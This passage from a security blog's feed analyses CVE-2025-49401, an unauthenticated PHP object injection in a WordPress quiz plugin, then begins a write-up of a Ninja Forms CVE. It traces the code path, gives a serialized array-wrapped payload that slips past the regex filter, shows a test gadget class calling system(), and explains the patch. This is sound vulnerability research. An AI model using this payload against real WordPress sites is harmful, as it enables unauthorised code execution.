class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ajax_submit_results&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a request hits &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=qmn_process_quiz&lt;/code&gt;, the callback &lt;code&gt;ajax_submit_results()&lt;/code&gt; is executed.&lt;/p&gt;&#xA;&lt;p&gt;It then calls &lt;code&gt;submit_results()&lt;/code&gt;, JSON-encodes the output, and echoes it.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_json_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;submit_results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;submit_results()&lt;/code&gt; calls &lt;code&gt;display_results_text()&lt;/code&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$results_pages&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;display_results_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_quiz_options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$qmn_array_for_variables&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;display_results_text()&lt;/code&gt; calls &lt;code&gt;generate_pages()&lt;/code&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;QSM_Results_Pages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;generate_pages&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;generate_pages()&lt;/code&gt; applies the filter previously registered: &lt;code&gt;mlw_qmn_template_variable_results_page&lt;/code&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mlw_qmn_template_variable_results_page&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#34; title=&#34;Many callbacks registered&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/callback.png&#34; data-sub-html=&#34;&lt;h2&gt;Callback&lt;/h2&gt;&lt;p&gt;Many callbacks registered&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#39; alt=&#34;Callback&#34; height=&#34;786&#34; width=&#34;1398&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Many callbacks registered&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Many callbacks are registered for this filter, but the relevant one here is &lt;code&gt;mlw_qmn_variable_question_answers&lt;/code&gt;, which directly triggers the function &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt; analyzed earlier.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;POST&amp;ensp;/wp-admin/admin-ajax.php&#34;]&amp;ensp;--&amp;ensp;action=qmn_process_quiz&amp;other_post_data&amp;ensp;--&gt;&amp;ensp;B[&#34;wp_ajax_nopriv_qmn_process_quiz&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;ajax_submit_results()&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;submit_results()&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;display_results_text()&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;generate_pages()&#34;]&#xD;&#xA;F&amp;ensp;--&amp;ensp;apply&amp;ensp;filter&amp;ensp;mlw_qmn_template_variable_results_page&amp;ensp;--&gt;&amp;ensp;G[&#34;mlw_qmn_variable_question_answers()&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;qsm_questions_answers_shortcode_to_text()&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;K{&#34;&amp;ensp;!&amp;ensp;empty(&amp;ensp;$_POST[&#39;quiz_answer_random_ids&#39;]&amp;ensp;)&#34;}&#xD;&#xA;K&amp;ensp;--&amp;ensp;true&amp;ensp;--&gt;&amp;ensp;L[&#34;qmn_sanitize_random_ids_data()&#34;]&amp;ensp;--&gt;&amp;ensp;M{&#34;preg_match(&amp;ensp;&#39;/^(O|C):\d+:/&#39;,&amp;ensp;$qmn_sanitize_random_ids&amp;ensp;)&#34;}&#xD;&#xA;M&amp;ensp;--&amp;ensp;true&amp;ensp;--&gt;&amp;ensp;N[&#34;return&amp;ensp;&#39;&#39;&#34;]&#xD;&#xA;M&amp;ensp;--&amp;ensp;false&amp;ensp;--&gt;&amp;ensp;V[&#34;maybe_unserialize&#34;]&amp;ensp;--&gt;&amp;ensp;W[&#34;RCE&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use the plugin to create a post with a quiz using the QSM block.&lt;/li&gt;&#xA;&lt;li&gt;Submit the form and intercept the request via Burp.&lt;/li&gt;&#xA;&lt;li&gt;Modify the value of &lt;code&gt;quiz_answer_random_ids&lt;/code&gt; to contain the serialized payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;a:1:{i:0;O:15:&amp;#34;ObjectInjection&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls&amp;ensp;/&amp;#34;;}}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Resend the request.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;To test locally, create a class with a magic method &lt;code&gt;__wakeup()&lt;/code&gt; or &lt;code&gt;__destruct()&lt;/code&gt; in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;ObjectInjection&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-49401&lt;/strong&gt; vulnerability is caused by unsafe input handling through &lt;code&gt;maybe_unserialize()&lt;/code&gt;, allowing unauthenticated attackers to provide serialized payloads to trigger PHP Object Injection. The filtering based on &lt;code&gt;preg_match&lt;/code&gt; only blocks payloads beginning with &lt;code&gt;O:&lt;/code&gt; or &lt;code&gt;C:&lt;/code&gt; but fails against serialized arrays containing objects. Combined with an open AJAX endpoint (&lt;code&gt;wp_ajax_nopriv_qmn_process_quiz&lt;/code&gt;), the payload moves through several layers before being unserialized, ultimately enabling arbitrary code execution (RCE) if a suitable gadget chain exists.&#xA;The patch uses &lt;code&gt;unserialize(...,&amp;ensp;[&#39;allowed_classes&#39;&amp;ensp;=&amp;gt;&amp;ensp;false])&lt;/code&gt;, completely eliminating object creation and fully mitigating the vulnerability.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;maybe_unserialize() is inherently dangerous&lt;/strong&gt; when handling user input in WordPress.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Manual regex filtering is insufficient&lt;/strong&gt; to stop deserialization attacks — attackers can wrap malicious objects inside arrays.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Unauthenticated AJAX endpoints&lt;/strong&gt; are highly sensitive attack surfaces.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;allowed_classes = false&lt;/strong&gt; is the safest mitigation when object deserialization is not needed.&lt;/li&gt;&#xA;&lt;li&gt;The more complex the plugin, the &lt;strong&gt;higher the chance of gadget chains leading to RCE&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/quiz-master-next/vulnerability/wordpress-quiz-and-survey-master-plugin-10-2-5-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin &amp;lt;= 10.2.5 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9083 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-14-cve-2025-9083/</link>
      <pubDate>Fri, 14 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-14-cve-2025-9083/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;This plugin performs an &lt;strong&gt;unserialize&lt;/strong&gt; operation on data submitted by users through form fields. This allows &lt;strong&gt;unauthenticated users&lt;/strong&gt; to perform &lt;strong&gt;PHP Object Injection&lt;/strong&gt; if a suitable gadget exists within the system.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9083&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9083&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-forms/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Ninja Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a 